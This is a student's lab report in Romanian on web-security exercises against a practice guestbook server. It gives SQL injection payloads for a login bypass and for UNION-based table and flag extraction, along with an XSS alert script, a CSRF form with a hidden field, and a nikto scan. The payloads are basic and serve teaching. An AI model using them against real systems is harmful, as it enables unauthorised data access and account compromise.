Student: Margineanu Vladut
Grupa: 341 C2

						Laborator 8

	Cerinta 1

 Serverul ruleaza direct un query. Cu urmatorul SQL injection (cu stringurile date la login):
```
 SELECT * FROM tabela WHERE username=<user> AND PASSWORD=<passwd> LIMIT 	1
```
```
 SELECT * FROM tabela WHERE username='' OR 1=1 -- ' AND PASSWORD=<passwd>
```
Comment:  username este string care se evalueaza la true: 
	```
	' ' OR 1=1 -- ' fac ca restul comenzii, pana la ' sa fie comentat
	```

	Cerinta 2
	
```
 SELECT col1, col2... FROM tablename WHERE name='' UNION (SELECT 1, 2, ...)  -- bruteforce the number of columns! '
```

 1. Incercam sa ne logam cu:
```
  ' or 1 order by 1,2,3,4,5,6,7,8,9,10 -- x
```
 - se observa eroarea la coloana 5 => avem 4 coloane

 2. Ne logam cu:
 ```
  ' union select 1, 2, 3, group_concat(table_name separator ',') from information_schema.tables where table_schema='guestbook' -- x
  ```
 - se observa ca avem tabelele: entries, flags, users

 3. Aflam care e coloana cu flag-ul:
 ```
 ' union select 1, 2, 3, group_concat(column_name separator ',') from information_schema.columns where table_schema='guestbook' and table_name='flags' -- x
 ```

 4. Selectam flagul din tabela.
 ```
 ' union select 1, 2, 3, flag from guestbook.flags -- x
 ```

 Se obtine flag-ul: SpeishFlag{th1sw4sSQL1nj3cti0n}!

	Cerinta 3

 Mesajele scrise in chenarul din server sunt interpretate ca HTML. 
 Orice script e bagat in HTML si executat. Asadar, mesajul contine:
 
```
 <script>
 alert("Arafat!");
 </script> 
```
-  genereaza un "dialog box" in care scrie "Arafat!"

	Cerinta 4

 Form al guestbook-ului:
 ```
<form method="post" action="/guestbook/post">
  <p>
    <div><label for="message">Message:</label></div>
    <textarea id="message" name="message" rows="3" cols="80"></textarea>
  </p>
  <p>
    <input type="submit" value="Send">
  </p>
</form>
```

 L-am refactorizat local:
 ```
<form method="post" action="http://localhost:8080/guestbook/post">
  <p>
    <label>Boss:</label>
    <input type="hidden" id="message" name="message" value="Voucher 2021">
  </p>
  <p>
    <input type="submit" value="Click Here!">
  </p>
</form>
```

	Cerinta 5
 - cu utilitarul nikto, am scanat server-ul si am gasit fisierul server.js. 
 - l-am descarcat cu comanda curl si l-am adaugat in arhiva

 




